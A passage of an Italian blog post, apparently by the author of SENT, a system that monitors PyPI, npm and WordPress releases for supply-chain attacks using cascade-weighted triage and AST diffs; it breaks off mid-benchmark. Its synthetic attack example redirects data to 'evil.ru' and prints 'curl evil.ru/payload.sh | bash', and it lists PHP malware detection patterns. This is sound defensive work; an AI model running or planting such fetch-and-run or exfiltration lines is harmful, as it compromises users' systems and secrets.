@@ -1,0 +1,772 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <script>(function(){var t;if(location.search.indexOf('t=l')>-1)t='light';else if(location.search.indexOf('t=d')>-1)t='dark';if(!t)try{t=localStorage.getItem('theme')}catch(e){}document.documentElement.dataset.theme=t||'dark'})()</script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>8100 Release l'Ora, Nessuno Guarda | Signal Pirate</title>
+  <meta name="description" content="Da un thread su Twitter a un sistema funzionante: SENT monitora 8100+ release/ora su PyPI, npm e WordPress, usa un grafo pesato a cascata per la prioritizzazione e AST diff per trovare modifiche stealth. Costruito con un sistema di agenti.">
+  <link rel="icon" type="image/svg+xml" href="../assets/favicon.svg">
+  <link rel="alternate" type="application/rss+xml" title="Signal Pirate" href="../feed.xml">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=JetBrains+Mono:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/style.css">
+
+  <style>
+    .insight-box {
+      background: linear-gradient(135deg, rgba(124,77,255,0.1), rgba(0,255,136,0.05));
+      border-left: 3px solid var(--accent-highlight);
+      border-radius: 0 10px 10px 0;
+      padding: 1.2rem 1.5rem;
+      margin: 1.5rem 0;
+    }
+    .insight-box p { margin: 0; line-height: 1.6; }
+
+    .warning-box {
+      background: linear-gradient(135deg, rgba(255,107,107,0.1), rgba(255,136,0,0.05));
+      border-left: 3px solid var(--accent-reaction);
+      border-radius: 0 10px 10px 0;
+      padding: 1.2rem 1.5rem;
+      margin: 1.5rem 0;
+    }
+    .warning-box p { margin: 0; line-height: 1.6; }
+
+    .section-number {
+      display: block;
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      color: var(--text-secondary);
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      margin-bottom: 1rem;
+    }
+
+    .code-block {
+      background: #0d1117;
+      border: 1px solid rgba(0,255,136,0.12);
+      border-radius: 10px;
+      margin: 1.5rem 0;
+      overflow-x: auto;
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      line-height: 1.7;
+      color: #c8c8d8;
+      position: relative;
+    }
+    .code-block::before {
+      content: attr(data-lang);
+      position: absolute;
+      top: 0.5rem;
+      right: 0.8rem;
+      font-size: 0.65rem;
+      color: rgba(0,255,136,0.4);
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      z-index: 1;
+    }
+    .code-block table { border-collapse: collapse; width: 100%; }
+    .code-block td { padding: 0; vertical-align: top; border: none; }
+    .code-block td:hover { background: none; }
+    .code-block .ln {
+      width: 3.2em;
+      padding: 0.2em 0.8em 0.2em 0.6em;
+      text-align: right;
+      color: #3a3a5a;
+      user-select: none;
+      border-right: 1px solid #1a1a2e;
+      background: #090d14;
+      font-size: 0.72rem;
+    }
+    .code-block .code { padding: 0.2em 0 0.2em 1em; white-space: pre; }
+    .code-block .code-wrap { padding: 0.8rem 0; }
+
+    .ck { color: #7c4dff; }
+    .cs { color: #00ff88; }
+    .cn { color: #b5cea8; }
+    .cc { color: #6a6a8a; }
+    .cf { color: #4ecdc4; }
+    .cv { color: #9cdcfe; }
+    .ct { color: #4ec9b0; }
+    .cm { color: #6a9955; }
+    .kw { color: #7c4dff; }
+    .fn { color: #4ecdc4; }
+    .nb { color: #b5cea8; }
+    .co { color: #d4d4d4; }
+    .cw { color: #ff6b6b; }
+
+    .terminal-output {
+      background: #0d1117;
+      border: 1px solid rgba(0,255,136,0.12);
+      border-radius: 10px;
+      padding: 1rem 1.2rem;
+      margin: 1.5rem 0;
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      line-height: 1.8;
+      overflow-x: auto;
+      color: #c8c8d8;
+    }
+    .terminal-output .t-prompt { color: #00ff88; }
+    .terminal-output .t-cmd { color: #fff; }
+    .terminal-output .t-out { color: #8b949e; display: block; }
+    .terminal-output .t-ok { color: #00ff88; }
+    .terminal-output .t-warn { color: #ff6b6b; }
+    .terminal-output .t-highlight { color: #ff8800; }
+
+    .pipeline-steps {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+      gap: 1rem;
+      margin: 1.5rem 0;
+    }
+    .pipeline-step {
+      background: var(--bg-secondary);
+      border: 1px solid var(--border-subtle);
+      border-radius: 10px;
+      padding: 1.2rem;
+      text-align: center;
+      transition: transform 0.2s;
+    }
+    .pipeline-step:hover { transform: translateY(-2px); }
+    .step-num {
+      font-family: var(--font-mono);
+      font-weight: 800;
+      font-size: 1.5rem;
+      color: var(--accent-attention);
+    }
+    .step-name {
+      font-family: var(--font-mono);
+      font-weight: 600;
+      font-size: 0.85rem;
+      margin-top: 0.5rem;
+    }
+    .step-detail {
+      font-size: 0.78rem;
+      color: var(--text-secondary);
+      margin-top: 0.3rem;
+      line-height: 1.4;
+    }
+
+    .stats-row {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+      gap: 1rem;
+      margin: 1.5rem 0;
+    }
+    .stat-card {
+      background: var(--bg-secondary);
+      border: 1px solid var(--border-subtle);
+      border-radius: 10px;
+      padding: 1.2rem;
+      text-align: center;
+    }
+    .stat-value {
+      font-family: var(--font-mono);
+      font-weight: 800;
+      font-size: 1.8rem;
+      color: var(--accent-attention);
+      display: block;
+    }
+    .stat-label {
+      font-size: 0.78rem;
+      color: var(--text-secondary);
+      letter-spacing: 0.06em;
+      margin-top: 0.3rem;
+    }
+
+    .attack-flow {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      margin: 1.5rem 0;
+      overflow-x: auto;
+      padding: 1rem;
+      background: var(--bg-secondary);
+      border-radius: 10px;
+      border: 1px solid var(--border-subtle);
+    }
+    .flow-node {
+      background: var(--bg-tertiary);
+      border: 1px solid rgba(0,255,136,0.2);
+      border-radius: 8px;
+      padding: 0.6rem 1rem;
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      white-space: nowrap;
+      text-align: center;
+      min-width: 100px;
+    }
+    .flow-node.hot { border-color: rgba(255,136,0,0.5); color: var(--accent-rejection); }
+    .flow-node.cold { border-color: rgba(0,255,136,0.3); color: var(--accent-attention); }
+    .flow-node.alert { border-color: rgba(255,107,107,0.5); color: var(--accent-reaction); }
+    .flow-arrow { color: var(--text-secondary); font-size: 1.2rem; flex-shrink: 0; }
+
+    .accent { color: var(--accent-attention); }
+    .article-content strong { color: var(--accent-yellow); }
+    code {
+      font-family: var(--font-mono);
+      font-size: 0.85em;
+      background: rgba(0,255,136,0.08);
+      padding: 0.15em 0.4em;
+      border-radius: 4px;
+      color: var(--accent-attention);
+    }
+
+    .tweet-box {
+      background: var(--bg-secondary);
+      border: 1px solid var(--border-subtle);
+      border-radius: 12px;
+      padding: 1.5rem;
+      margin: 1.5rem 0;
+      font-style: italic;
+      line-height: 1.7;
+    }
+    .tweet-box .tweet-author {
+      font-style: normal;
+      font-family: var(--font-mono);
+      font-size: 0.8rem;
+      color: var(--accent-highlight);
+      display: block;
+      margin-bottom: 0.5rem;
+    }
+
+    .comparison-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 1.5rem 0;
+      font-size: 0.85rem;
+    }
+    .comparison-table th, .comparison-table td {
+      padding: 0.8rem 1rem;
+      border: 1px solid var(--border-subtle);
+      text-align: left;
+    }
+    .comparison-table th {
+      background: var(--bg-secondary);
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+    }
+  </style>
+</head>
+<body>
+
+  <nav class="nav">
+    <a href="../index.html" class="nav-logo">SIGNAL<span>PIRATE</span></a>
+    <ul class="nav-links">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="../index.html#articoli">Articoli</a></li>
+      <li><a href="https://github.com/pinperepette" target="_blank" rel="noopener">GitHub</a></li>
+    </ul>
+    <button id="theme-toggle" aria-label="Cambia tema">
+      <svg id="theme-icon-dark" viewBox="0 0 24 24"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+      <svg id="theme-icon-light" viewBox="0 0 24 24"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+    </button>
+  </nav>
+
+  <header class="article-header">
+    <p class="article-meta">2026-03-25 | Pinperepette</p>
+    <h1 class="article-page-title">8100 Release l'Ora, <span class="accent">Nessuno Guarda</span></h1>
+    <p style="font-family: var(--font-mono); font-size: 1rem; color: var(--text-secondary); margin-top: 1rem; max-width: 700px; margin-left: auto; margin-right: auto;">
+      Da un thread su Twitter a un sistema funzionante. 8100 release all'ora, un grafo pesato a cascata, AST diff per trovare modifiche stealth. Costruito con un sistema di agenti AI in una sessione.
+    </p>
+    <div class="article-card-tags" style="justify-content: center; margin-top: 1.5rem;">
+      <span class="tag tag-attention">Supply Chain</span>
+      <span class="tag tag-highlight">Agent-Driven Dev</span>
+      <span class="tag tag-reaction">Real-time Detection</span>
+      <span class="tag tag-amplification">PyPI / npm / WordPress</span>
+    </div>
+  </header>
+
+  <article class="article-content">
+
+<!-- ============================================================
+     SEZIONE 1 — IL THREAD
+     ============================================================ -->
+<h2><span class="section-number">01 — il thread</span>Il tweet che ha fatto partire tutto</h2>
+
+<p>
+  Tutto e' iniziato con un numero. <a href="https://twitter.com/N3mes1s" target="_blank">@N3mes1s</a> stava misurando il volume di release sui package manager. Solo Python, JavaScript e Rust. Il risultato:
+</p>
+
+<div class="stats-row">
+  <div class="stat-card">
+    <span class="stat-value">~5,600</span>
+    <span class="stat-label">Release/ora su PyPI</span>
+  </div>
+  <div class="stat-card">
+    <span class="stat-value">~2,200</span>
+    <span class="stat-label">Release/ora su npm</span>
+  </div>
+  <div class="stat-card">
+    <span class="stat-value">~260</span>
+    <span class="stat-label">Release/ora su crates.io</span>
+  </div>
+  <div class="stat-card">
+    <span class="stat-value">~8,100</span>
+    <span class="stat-label">Totale: 2.25 al secondo</span>
+  </div>
+</div>
+
+<p>
+  Due release al secondo. Di continuo. Se pensi che qualcuno le stia guardando tutte, no. La domanda di @N3mes1s era semplice: perche' nessuna delle aziende che vende "dependency scanning" intercetta questa roba in tempo reale? Tutte lavorano dopo. Qualcuno trova un pacchetto malevolo, lo segnala, e a quel punto e' stato installato migliaia di volte. Ogni minuto tra la pubblicazione di una release malevola e la sua scoperta e' una finestra aperta. E in quella finestra, <code>pip install</code> continua a girare. Automatizzato. Inconsapevole. Felice.
+</p>
+
+<p>
+  A quel punto si inserisce <a href="https://twitter.com/evilsocket" target="_blank">@evilsocket</a> (Simone Margaritelli) con due idee che hanno definito l'architettura di tutto quello che ho costruito dopo.
+</p>
+
+<p>
+  Prima idea: costruisci un grafo pesato globale delle dipendenze, dove il peso di ogni nodo e' il cumulo dei download di tutto quello che ne dipende, a cascata. Poi rifletti quel peso all'indietro nella catena, e dai priorita' ai nodi con peso piu' alto. Non cercare di scansionare tutto. Un pacchetto con 100 download propri ma da cui dipende <code>requests</code> (1.2 miliardi di download/mese) ha un peso effettivo di 1.2 miliardi. Se qualcuno lo compromette, l'impatto e' su tutto l'ecosistema.
+</p>
+
+<p>
+  Seconda idea: quando esce una nuova versione, non darla intera all'AI. Fai il diff con la versione precedente e analizza solo quello che e' cambiato. Cosi' l'analisi e' veloce, economica, e il segnale e' pulito.
+</p>
+
+<p>
+  Due tweet. Un'architettura completa. Ho deciso di costruirla.
+</p>
+
+
+<!-- ============================================================
+     SEZIONE 2 — IL PROCESSO
+     ============================================================ -->
+<h2><span class="section-number">02 — il processo</span>Agenti, non prompt</h2>
+
+<p>
+  Sto sviluppando e testando un sistema di agenti per scrivere e validare codice. Non un chatbot a cui chiedi e copi la risposta. Un sistema con architettura a piu' livelli: un agente orchestratore che scompone il task in sotto-obiettivi, agenti specializzati che eseguono (uno scrive, uno cerca nel codebase, uno esplora la struttura), e un loop di validazione che verifica l'output prima di proseguire.
+</p>
+
+<p>
+  L'agente ha accesso diretto al filesystem, al terminale, alla rete. Legge i file del progetto, esegue i comandi, osserva l'output, decide il passo successivo. Ha un sistema di memoria persistente che sopravvive tra le sessioni: sa chi sono, come lavoro, quali scelte architetturali abbiamo fatto, quali feedback gli ho dato in passato. Non parte da zero ogni volta.
+</p>
+
+<p>
+  Il ciclo:
+</p>
+
+<div class="pipeline-steps">
+  <div class="pipeline-step">
+    <div class="step-num">1</div>
+    <div class="step-name">Spec</div>
+    <div class="step-detail">Definisco vincoli architetturali, l'agente scompone in sotto-task</div>
+  </div>
+  <div class="pipeline-step">
+    <div class="step-num">2</div>
+    <div class="step-name">Build</div>
+    <div class="step-detail">Scrive il codice, struttura i moduli, risolve le dipendenze tra file</div>
+  </div>
+  <div class="pipeline-step">
+    <div class="step-num">3</div>
+    <div class="step-name">Validate</div>
+    <div class="step-detail">Esegue il codice, osserva l'output, confronta con l'atteso</div>
+  </div>
+  <div class="pipeline-step">
+    <div class="step-num">4</div>
+    <div class="step-name">Iterate</div>
+    <div class="step-detail">Se qualcosa non torna, corregge. Se cambio i requisiti, adatta</div>
+  </div>
+</div>
+
+<p>
+  Un esempio. Gli dico: "implementa il grafo pesato a cascata con propagazione in ordine topologico inverso". L'agente legge <code>dependency_graph.py</code>, capisce la struttura (networkx DiGraph, edge A → B = "A dipende da B"), scrive <code>_recompute_cascade</code> con cache e invalidazione, aggiorna lo scorer per usare <code>cascade_weight</code>, esegue un test su pacchetti reali. Se <code>packaging</code> non esce con amplificazione 35x, c'e' un bug nella propagazione. Se esce, avanti.
+</p>
+
+<p>
+  Altro. "Il sistema non rileva modifiche agli argomenti di funzioni esistenti". L'agente legge <code>ast_analyzer.py</code>, capisce che <code>diff_behaviors()</code> fa sottrazione di insiemi sui nomi delle chiamate (quindi <code>requests.post</code> presente in entrambe le versioni scompare dal delta), scrive <code>call_diff.py</code> con fingerprint per call site (nome, domini URL, sorgenti sensibili), lo testa su un attacco sintetico. Rapporto attacco/benigno: 7x (144 vs 21).
+</p>
+
+<div class="insight-box">
+  <p><strong>Il vincolo e' il contesto, non la generazione.</strong> SENT sono ~6000 righe, 30+ file, con AST parsing, scoring non lineare, worker pool e cache su disco. Generare codice e' la parte facile. Non rompere il resto del sistema e' la parte interessante. Tipo sapere che quando aggiungi <code>ingestion/wordpress.py</code> devi anche aggiornare <code>process_release()</code> in <code>main.py</code> per gestire il nuovo ecosistema, aggiungere "wordpress" alle <code>Choice</code> di click in <code>cli.py</code>, e scrivere <code>_analyze_wordpress()</code> in <code>differ.py</code> che usa <code>svn diff</code> invece di scaricare archivi. L'agente tiene in memoria l'intero grafo delle dipendenze tra i moduli del progetto. Non deve rileggere tutto ogni volta.</p>
+</div>
+
+
+<!-- ============================================================
+     SEZIONE 3 — L'ARCHITETTURA
+     ============================================================ -->
+<h2><span class="section-number">03 — l'architettura</span>Tre strati, un principio</h2>
+
+<p>
+  Il problema non e' rilevare attacchi, e' decidere dove guardare prima. Con 8100 release all'ora il vincolo non e' la capacita' di analisi ma l'allocazione del compute. Triage computazionale.
+</p>
+
+<div class="attack-flow">
+  <div class="flow-node hot">8100 release/ora<br><small>PyPI + npm + WordPress</small></div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-node cold">Cascade scoring<br><small>~80 da analizzare</small></div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-node cold">AST diff + call_diff<br><small>1.3ms/pacchetto</small></div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-node alert">Alert<br><small>~0.4% va all'AI</small></div>
+</div>
+
+<p>
+  <strong>Strato 1: il grafo a cascata.</strong> All'avvio il sistema scarica i metadati dei top 200 pacchetti PyPI e npm. Per ognuno, recupera le dipendenze e i download reali da pypistats.org. Costruisce un grafo diretto (A → B = "A dipende da B") e propaga i pesi all'indietro: il cascade weight di B e' i suoi download + la somma dei cascade weight di tutti quelli che dipendono da B.
+</p>
+
+<div class="code-block" data-lang="python">
+<div class="code-wrap"><table><tbody>
+<tr><td class="ln">1</td><td class="code"><span class="cc"># La propagazione e' un singolo passaggio in ordine topologico inverso</span></td></tr>
+<tr><td class="ln">2</td><td class="code"><span class="ck">for</span> <span class="cv">node</span> <span class="ck">in</span> <span class="cf">reversed</span>(<span class="cv">topo_order</span>):</td></tr>
+<tr><td class="ln">3</td><td class="code">    <span class="cv">node_weight</span> = <span class="cv">cascade</span>[<span class="cv">node</span>]</td></tr>
+<tr><td class="ln">4</td><td class="code">    <span class="ck">for</span> <span class="cv">dep</span> <span class="ck">in</span> <span class="cv">g</span>.<span class="cf">successors</span>(<span class="cv">node</span>):  <span class="cc"># le dipendenze di node</span></td></tr>
+<tr><td class="ln">5</td><td class="code">        <span class="cv">cascade</span>[<span class="cv">dep</span>] += <span class="cv">node_weight</span>   <span class="cc"># propaga il peso in giu'</span></td></tr>
+</tbody></table></div>
+</div>
+
+<p>Il risultato su dati reali:</p>
+
+<table class="comparison-table">
+  <thead>
+    <tr>
+      <th>Pacchetto</th>
+      <th>Download propri</th>
+      <th>Cascade weight</th>
+      <th>Amplificazione</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code>urllib3</code></td>
+      <td>1.3 miliardi/mese</td>
+      <td>13 miliardi</td>
+      <td>10x</td>
+    </tr>
+    <tr>
+      <td><code>certifi</code></td>
+      <td>1.3 miliardi/mese</td>
+      <td>15.6 miliardi</td>
+      <td>12x</td>
+    </tr>
+    <tr>
+      <td><code>packaging</code></td>
+      <td>1.5 miliardi/mese</td>
+      <td>51.7 miliardi</td>
+      <td>35x</td>
+    </tr>
+    <tr>
+      <td><code>flask</code></td>
+      <td>219 milioni/mese</td>
+      <td>991 milioni</td>
+      <td>4.5x</td>
+    </tr>
+    <tr>
+      <td><code>random-unknown-pkg</code></td>
+      <td>50</td>
+      <td>50</td>
+      <td>1x</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>
+  <code>packaging</code> ha un'amplificazione di 35x. Se qualcuno compromette <code>packaging</code>, l'effettivo blast radius non sono i suoi 1.5 miliardi di download. Sono 51.7 miliardi. Lo score di priorita' e' <code>log(cascade_weight + 1)</code>: packaging ottiene 24.7, il pacchetto sconosciuto ottiene 3.9. Uno viene analizzato, l'altro no.
+</p>
+
+<p>
+  <strong>Strato 2: compressione semantica.</strong> Il diff non e' un'ottimizzazione, e' una trasformazione del problema. Il codice completo di un pacchetto e' rumore. Il diff tra due versioni e' segnale. Quando un pacchetto passa il filtro, il sistema scarica la versione precedente e quella nuova (o usa la cache), le estrae, e calcola il diff a tre livelli:
+</p>
+
+<p>
+  <em>File-level.</em> Quali file sono stati aggiunti, rimossi, modificati.<br>
+  <em>Behavioral-level.</em> Per i file Python, il sistema fa il parse dell'AST di entrambe le versioni, estrae i comportamenti (import, chiamate, accessi ad attributi), e calcola il delta. Solo i comportamenti <strong>nuovi</strong> vengono analizzati.<br>
+  <em>Argument-level.</em> Per le chiamate che esistevano gia', confronta gli argomenti. Se <code>requests.post("legit.com")</code> diventa <code>requests.post("evil.ru")</code>, non e' un comportamento nuovo (la chiamata c'era gia') ma e' un cambio critico.
+</p>
+
+<p>
+  <strong>Strato 3: scoring non lineare.</strong> Le feature estratte dal diff vengono pesate e combinate. Ma non linearmente: certe combinazioni amplificano il rischio in modo esponenziale.
+</p>
+
+<table class="comparison-table">
+  <thead>
+    <tr>
+      <th>Combinazione</th>
+      <th>Bonus</th>
+      <th>Perche'</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>URL cambiato + dati sensibili aggiunti</td>
+      <td>+50</td>
+      <td>Pattern di exfiltration stealth</td>
+    </tr>
+    <tr>
+      <td>env access + network call</td>
+      <td>+35</td>
+      <td>Credential exfiltration</td>
+    </tr>
+    <tr>
+      <td>obfuscation + exec</td>
+      <td>+35</td>
+      <td>Payload delivery</td>
+    </tr>
+    <tr>
+      <td>install hook + subprocess</td>
+      <td>+25</td>
+      <td>Install-time command execution</td>
+    </tr>
+  </tbody>
+</table>
+
+
+<!-- ============================================================
+     SEZIONE 4 — IL BLIND SPOT
+     ============================================================ -->
+<h2><span class="section-number">04 — il blind spot</span>L'attacco che il diff non vede</h2>
+
+<p>
+  Il sistema funzionava. Poi ho pensato a questo scenario:
+</p>
+
+<div class="code-block" data-lang="python">
+<div class="code-wrap"><table><tbody>
+<tr><td class="ln">1</td><td class="code"><span class="cc"># v1, legittimo</span></td></tr>
+<tr><td class="ln">2</td><td class="code"><span class="cv">requests</span>.<span class="cf">post</span>(<span class="cs">"https://analytics.mycompany.com/events"</span>, <span class="cv">json</span>=<span class="cv">payload</span>)</td></tr>
+<tr><td class="ln">3</td><td class="code"></td></tr>
+<tr><td class="ln">4</td><td class="code"><span class="cc"># v2, compromesso (stessa funzione, argomenti diversi)</span></td></tr>
+<tr><td class="ln">5</td><td class="code"><span class="cv">requests</span>.<span class="cf">post</span>(<span class="cs">"https://evil.ru/events"</span>, <span class="cv">json</span>=<span class="cv">payload</span>)</td></tr>
+</tbody></table></div>
+</div>
+
+<p>
+  Il behavioral diff vede <code>requests.post</code> in entrambe le versioni. Non e' un comportamento nuovo. Lo ignora. Ma l'URL e' cambiato da <code>mycompany.com</code> a <code>evil.ru</code>. Gli attacchi moderni non aggiungono codice. Cambiano una riga e sperano che nessuno se ne accorga.
+</p>
+
+<p>
+  Serviva un nuovo livello di analisi. L'ho chiamato <code>call_diff</code>: per ogni file Python modificato, estrae le "impronte" di ogni chiamata di funzione (nome, domini URL negli argomenti, sorgenti sensibili come <code>os.environ</code>) dalla versione vecchia e da quella nuova, poi le confronta.
+</p>
+
+<p>
+  Tre tipi di mutazione rilevati:
+</p>
+
+<p>
+  <strong>url_changed</strong>: il dominio di un URL passato a una funzione di rete e' cambiato.<br>
+  <strong>sensitive_added</strong>: <code>os.environ</code> o <code>getenv</code> appaiono come argomento di una chiamata di rete o subprocess che prima non li aveva.<br>
+  <strong>cmd_changed</strong>: la stringa passata a <code>subprocess.run</code> e' cambiata.
+</p>
+
+<p>
+  L'ho testato con un attacco sintetico: stessa struttura del codice, stesse funzioni, ma URL rediretto, <code>os.environ</code> aggiunto come parametro, e comando subprocess cambiato in <code>curl evil.ru/payload.sh | bash</code>.
+</p>
+
+<div class="terminal-output">
+<span class="t-out">============================================================</span>
+<span class="t-out">  SCENARIO 1: Aggiornamento benigno (v1 → v2)</span>
+<span class="t-out">============================================================</span>
+<span class="t-out">  Risk Score: <span class="t-ok">21</span></span>
+<span class="t-out">  Mutations: 1 (cambio path benigno)</span>
+<span class="t-out"></span>
+<span class="t-out">============================================================</span>
+<span class="t-out">  SCENARIO 2: Attacco stealth (v1 → v2-compromesso)</span>
+<span class="t-out">============================================================</span>
+<span class="t-out">  Risk Score: <span class="t-warn">144</span></span>
+<span class="t-out">  Mutations:</span>
+<span class="t-out">    <span class="t-warn">[network]</span> URL changed → evil.ru</span>
+<span class="t-out">    <span class="t-warn">[sensitive]</span> os.environ now flows into requests.get</span>
+<span class="t-out">    <span class="t-warn">[execution]</span> Subprocess command changed to "curl evil.ru/payload.sh | bash"</span>
+<span class="t-out">  Ratio: <span class="t-warn">7x</span></span>
+</div>
+
+<p>
+  Score 21 vs 144. Rapporto 7x. La stessa struttura di codice, le stesse funzioni, ma il call_diff vede il cambio di argomenti che il behavioral diff ignora. Il bonus di combinazione "URL changed + sensitive data added" aggiunge +50 da solo.
+</p>
+
+
+<!-- ============================================================
+     SEZIONE 5 — WORDPRESS
+     ============================================================ -->
+<h2><span class="section-number">05 — wordpress</span>Il repo che nessuno guarda. Letteralmente.</h2>
+
+<p>
+  Simo non contento di avermi mandato in fissa col grafo a cascata, ha continuato a scrivermi in DM. Me lo immagino che rideva mentre mi mandava link uno dopo l'altro. A un certo punto mi arriva <code>https://plugins.svn.wordpress.org/</code>. Il repo SVN pubblico di tutti i plugin WordPress. Pubblico, ma quasi nessuno lo sa.
+</p>
+
+<p>
+  WordPress e' il 43% del web. Il suo repo SVN e' pubblico, contiene tutti i plugin, e <strong>SVN ti da' il diff tra versioni senza scaricare nulla</strong>. Mentre per PyPI e npm devi scaricare due archivi interi ed estrarli, per WordPress basta:
+</p>
+
+<div class="code-block" data-lang="bash">
+<div class="code-wrap"><table><tbody>
+<tr><td class="ln">1</td><td class="code"><span class="cv">svn</span> <span class="cv">diff</span> --old https://plugins.svn.wordpress.org/<span class="cv">plugin</span>/tags/<span class="cv">1.0</span> \</td></tr>
+<tr><td class="ln">2</td><td class="code">         --new https://plugins.svn.wordpress.org/<span class="cv">plugin</span>/tags/<span class="cv">1.1</span></td></tr>
+</tbody></table></div>
+</div>
+
+<p>
+  Il diff viene calcolato server-side. Zero download, zero estrazione. Un vantaggio strutturale: una fonte dati pubblica che quasi nessuno usa, con un protocollo che ti da' esattamente l'informazione che serve senza overhead. Per i plugin WordPress ho scritto un set di pattern specifici per PHP: <code>eval()</code>, <code>base64_decode</code>, creazione di utenti admin (<code>wp_create_user</code>), bypass dei nonce, accesso a <code>wp-config.php</code>, injection via <code>preg_replace</code> con il modificatore <code>/e</code>.
+</p>
+
+<p>
+  Il sistema ora monitora tre ecosistemi in parallelo. Stesso worker pool, stessa coda con priorita', stessi alert.
+</p>
+
+
+<!-- ============================================================
+     SEZIONE 6 — DYANA
+     ============================================================ -->
+<h2><span class="section-number">06 — dyana</span>Analisi statica + detonazione dinamica</h2>
+
+<p>
+  Simone mi conosce. Sa che vado in fissa sulle cose e probabilmente si diverte a vedere fin dove arrivo. Quindi dopo il repo SVN mi manda un altro link: <a href="https://github.com/dreadnode/dyana" target="_blank">dyana</a>, un sandbox che lui e il team di dreadnode hanno scritto. Installa il pacchetto in un container isolato tracciato con eBPF e registra tutto: connessioni di rete, accesso al filesystem, syscall sospette.
+</p>
+
+<p>
+  SENT fa analisi statica: guarda il codice senza eseguirlo. dyana fa analisi dinamica: lo esegue e osserva cosa fa. Sono complementari. SENT filtra 8100 release all'ora e trova i sospetti. dyana li detona per conferma.
+</p>
+
+<div class="code-block" data-lang="bash">
+<div class="code-wrap"><table><tbody>
+<tr><td class="ln">1</td><td class="code"><span class="cc"># analisi statica + detonazione dinamica in un comando</span></td></tr>
+<tr><td class="ln">2</td><td class="code"><span class="cv">python3</span> cli.py analyze <span class="cv">pacchetto-sospetto</span> -e pypi --dyana</td></tr>
+<tr><td class="ln">3</td><td class="code"></td></tr>
+<tr><td class="ln">4</td><td class="code"><span class="cc"># oppure automatico nel watch: detona solo se score >= 200</span></td></tr>
+<tr><td class="ln">5</td><td class="code">SENT_DYANA=1 SENT_DYANA_MIN_SCORE=200 <span class="cv">python3</span> cli.py watch -t 8 -i 30</td></tr>
+</tbody></table></div>
+</div>
+
+<p>
+  L'integrazione e' opzionale. Senza il flag <code>--dyana</code> il sistema non chiama dyana. Con il flag, lo chiama solo sui pacchetti che superano la soglia. Servono Docker in esecuzione e <code>pip install dyana</code>.
+</p>
+
+
+<!-- ============================================================
+     SEZIONE 7 — LA BASELINE
+     ============================================================ -->
+<h2><span class="section-number">07 — la baseline</span>Il falso positivo che non c'e'</h2>
+
+<p>
+  Il problema dei sistemi basati su regole e' che Flask usa <code>os.environ</code> legittimamente. Un sistema che flagga ogni <code>os.environ</code> come sospetto e' inutile. La soluzione classica sono le whitelist: "Flask puo' usare os.environ". Ma le whitelist non scalano e non coprono i nuovi pacchetti.
+</p>
+
+<p>
+  SENT fa il contrario. Non ha regole globali. Ha un modello locale per ogni pacchetto. Per ognuno mantiene una <strong>behavioral baseline</strong>: un profilo di cosa quel pacchetto fa normalmente. Usa la rete? Chiama exec? Accede all'ambiente? Alla prima analisi, tutto viene flaggato (non abbiamo trust signal). Dalla seconda in poi, solo i comportamenti <strong>mai visti prima per quel pacchetto</strong> vengono flaggati. Non esiste comportamento sospetto in assoluto. Esiste comportamento anomalo per quel codice.
+</p>
+
+<p>
+  Se Flask ha sempre usato <code>os.environ</code>, non viene flaggato. Se un pacchetto calcolatrice inizia improvvisamente a usare <code>os.environ</code> + <code>requests.post</code>, viene flaggato, e' anomalo <em>per quel pacchetto</em>. La sicurezza nella supply chain non e' statica, e' una funzione del tempo: il diff e' nel tempo, la baseline e' nel tempo, il flusso di release e' nel tempo. Il sistema e' costruito attorno a questa idea.
+</p>
+
+<p>
+  L'effetto e' misurabile. Flask 3.0.3 → 3.1.0:
+</p>
+
+<table class="comparison-table">
+  <thead>
+    <tr>
+      <th>Analisi</th>
+      <th>Score</th>
+      <th>Perche'</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Prima (nessuna baseline)</td>
+      <td>138</td>
+      <td>os.environ flaggato, anomaly multiplier attivo</td>
+    </tr>
+    <tr>
+      <td>Seconda (baseline popolata)</td>
+      <td>97</td>
+      <td>Flask usa os.environ da sempre → non anomalo</td>
+    </tr>
+  </tbody>
+</table>
+
+
+<!-- ============================================================
+     SEZIONE 8 — I NUMERI
+     ============================================================ -->
+<h2><span class="section-number">08 — i numeri</span>Benchmark su 10,000 eventi</h2>
+
+<p>
+  L'ultimo pezzo e' la performance. Un sistema che non tiene il passo con il flusso di release e' inutile. Ho scritto un benchmark che simula 10,000 eventi con distribuzione realistica di download (power law: 70% sotto 100, 3% sopra un milione).
+</p>
+
+<div class="stats-row">
+  <div class="stat-card">
+    <span class="stat-value">2,228</span>
